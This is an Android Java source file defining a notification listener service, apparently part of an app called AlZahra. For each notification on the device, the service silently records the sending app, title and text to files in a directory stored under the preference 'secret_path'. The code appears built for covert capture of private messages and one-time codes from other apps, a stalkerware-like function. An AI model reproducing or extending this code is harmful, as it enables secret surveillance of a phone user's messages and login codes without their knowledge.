package com.alzahra.service;
import android.content.SharedPreferences;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationService extends NotificationListenerService {
    private static final String TAG = "AlZahraNotif";
    private SharedPreferences prefs;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            String title = sbn.getNotification().extras.getString("android.title", "");
            String text = sbn.getNotification().extras.getString("android.text", "");
            String secretPath = prefs.getString("secret_path", "");
            if (secretPath.isEmpty()) return;
            File dir = new File(secretPath + "/notifications");
            if (!dir.exists()) dir.mkdirs();
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            File file = new File(dir, "notif_" + timestamp + ".txt");
            FileOutputStream fos = new FileOutputStream(file);
            String data = "Package: " + packageName + "\nTitle: " + title + "\nText: " + text + "\nTime: " + timestamp + "\n\n";
            fos.write(data.getBytes()); fos.close();
            Log.d(TAG, "Notification saved: " + packageName);
        } catch (Exception e) { Log.e(TAG, "Notification error", e); }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) { }
}
